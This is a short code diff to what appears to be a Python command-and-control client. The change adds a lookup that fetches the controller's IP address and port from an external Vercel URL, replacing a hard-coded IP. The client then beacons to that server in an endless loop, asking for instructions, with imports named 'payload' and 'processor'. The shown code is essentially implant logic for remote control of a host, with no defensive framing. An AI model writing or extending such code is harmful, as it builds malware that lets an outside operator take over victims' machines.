@@ -4,14 +4,16 @@ from apps.utils.objects import payload
 from apps.main import processor
 from apps.utils.handleExceptions import handle
 from apps.recovery import trying
+import requests
 
-HOST = '159.112.139.10'
-PORT = 7788
+responseServer = requests.get("https://varlives.vercel.app/?key=ipVPS").json()
+
+HOST = responseServer["value"]
+PORT = responseServer["port"]
 
 while True:
     time.sleep(5)
     try:
-        from apps.utils.objects import payloa
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((HOST, PORT))
         client.sendall(b'get')
